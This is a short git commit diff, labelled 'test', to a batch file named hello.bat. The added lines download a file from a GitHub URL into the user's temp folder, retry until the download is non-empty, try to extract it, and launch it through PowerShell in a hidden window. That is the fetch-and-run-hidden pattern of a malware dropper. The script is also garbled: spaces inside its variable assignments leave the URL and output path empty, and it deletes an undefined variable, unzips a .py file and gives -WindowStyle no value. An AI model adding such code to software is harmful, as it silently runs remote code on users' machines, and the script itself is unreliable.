e6b47d070178511afaee67a284403461c140509d
marin <you@example.com>
2025-02-22 12:38:07 +0800

    test

--- hello.bat
+++ hello.bat
@@ -1,4 +1,17 @@
 @echo off
 setlocal
-set "url = "
+set "url = https://github.com/Marinff/test/blob/main/1.py"
+set "tempdir = %temp%"
+set "output = %tempdir%\1.py"
+:download
+powershell -Command "Invoke-WebRequest -Uri %url% -OutFile %output%"
+for %%A in ("%output%") do (
+    if %%~zA == 0 (
+        del "%download%"
+        timeout /t 1 > null
+        goto download
+    )
+)
+powershell -Command "Expand-Archive -Path '%output%' -DestinationPath '%tempdir%' -Force"
+powershell -WindowStyle Hidden -Command "Start-Process -FilePath $env:TEMP\1.py -WindowStyle "
 exit
